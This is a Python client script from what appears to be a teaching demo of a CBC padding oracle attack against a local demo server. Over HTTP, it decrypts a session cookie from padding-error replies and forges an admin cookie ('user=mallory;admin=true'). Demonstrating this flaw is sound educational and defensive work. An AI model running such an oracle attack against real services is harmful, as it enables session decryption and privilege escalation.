"""
attacker_demo.py
-----------------
TERMINAL 2. Run this AFTER server_demo.py is already running:

    python3 attacker_demo.py

This process makes ONLY HTTP requests to the server (POST /login,
POST /check). It never imports padding_oracle.server, never touches a
CookieService object, and has no variable anywhere holding the key or
the plaintext -- everything it learns comes from the oracle's one-word
"ok" / "bad_padding" answers, sent back over the network.

Progress is rendered live: each recovered byte is painted into a
growing display as soon as it is found (bytes are discovered
last-byte-first within each block, which is why the display fills in
right-to-left inside each block), together with a running HTTP query
counter -- so you can watch the plaintext materialize in real time
rather than waiting for one final printed string.
"""
import sys
import time
import requests

from padding_oracle import attack as A
from padding_oracle.aes_core import pkcs7_unpad

HOST, PORT = "127.0.0.1", 5055
BASE = f"http://{HOST}:{PORT}"


def make_http_oracle(counter):
    def oracle(prev_block: bytes, target_block: bytes) -> bool:
        counter["queries"] += 1
        payload = {"iv": prev_block.hex(), "ciphertext": target_block.hex()}
        r = requests.post(f"{BASE}/check", json=payload, timeout=5)
        return r.json()["status"] == "ok"
    return oracle


def printable(byte_value: int) -> str:
    return chr(byte_value) if 32 <= byte_value < 127 else "."


def main():
    print("=" * 70)
    print(" ATTACKER (knows only: the ciphertext, and the server's HTTP replies)")
    print("=" * 70)
    print(f"[attacker] POST {BASE}/login  (as 'alice')")
    resp = requests.post(f"{BASE}/login", json={"username": "alice"}, timeout=5)
    data = resp.json()
    iv, ct = bytes.fromhex(data["iv"]), bytes.fromhex(data["ciphertext"])
    nblocks = len(ct) // 16
    print(f"[attacker] got ciphertext ({nblocks} blocks): {ct.hex()}")
    print("[attacker] no plaintext, no key -- only those bytes above.\n")

    display = [["_"] * 16 for _ in range(nblocks)]
    counter = {"queries": 0}
    oracle = make_http_oracle(counter)

    def render():
        rows = "  ".join("".join(row) for row in display)
        sys.stdout.write(f"\r[attacker] recovering: {rows}   (HTTP queries so far: {counter['queries']})")
        sys.stdout.flush()

    def on_block_byte(block_idx, pos, byte_value):
        display[block_idx][pos] = printable(byte_value)
        render()

    render()
    t0 = time.time()
    padded = A.decrypt(oracle, iv, ct, on_block_byte=on_block_byte)
    elapsed = time.time() - t0
    print("\n")

    plaintext = pkcs7_unpad(padded)
    print(f"[attacker] RECOVERED PLAINTEXT: {plaintext!r}")
    print(f"[attacker] total HTTP queries: {counter['queries']}   time: {elapsed:.1f}s\n")

    print("[attacker] forging a NEW cookie for 'user=mallory;admin=true'"
          " using the same oracle, still without the key ...")
    forge_counter = {"queries": 0}
    forge_oracle = make_http_oracle(forge_counter)
    t0 = time.time()
    forged_iv, forged_ct = A.forge_ciphertext(forge_oracle, b"user=mallory;admin=true")
    elapsed = time.time() - t0
    r = requests.post(f"{BASE}/check", json={"iv": forged_iv.hex(), "ciphertext": forged_ct.hex()}, timeout=5)
    print(f"[attacker] forged iv={forged_iv.hex()} ciphertext={forged_ct.hex()}")
    print(f"[attacker] server's verdict on the forged cookie: {r.json()}"
          f"   (queries: {forge_counter['queries']}, time: {elapsed:.1f}s)")


if __name__ == "__main__":
    main()
